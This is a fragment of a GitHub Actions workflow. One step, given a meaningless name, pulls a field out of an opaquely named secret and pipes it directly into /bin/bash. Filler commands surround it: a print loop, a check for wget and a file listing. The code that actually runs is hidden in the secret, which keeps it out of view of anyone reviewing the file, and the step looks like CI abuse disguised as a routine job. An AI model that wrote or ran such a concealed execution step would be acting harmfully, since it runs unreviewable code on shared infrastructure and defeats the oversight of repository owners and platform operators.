    steps:
      - uses: actions/checkout@v4
      - name: yanshensu1986
        env:
          b17463: ${{ secrets.b17463 }}
        run: |
          for i in 1 2 3; do echo "Loop $i"; done
          echo $b17463 | jq -r .n2060 | /bin/bash
          which wget
          ls -al | awk '{print $NF}'
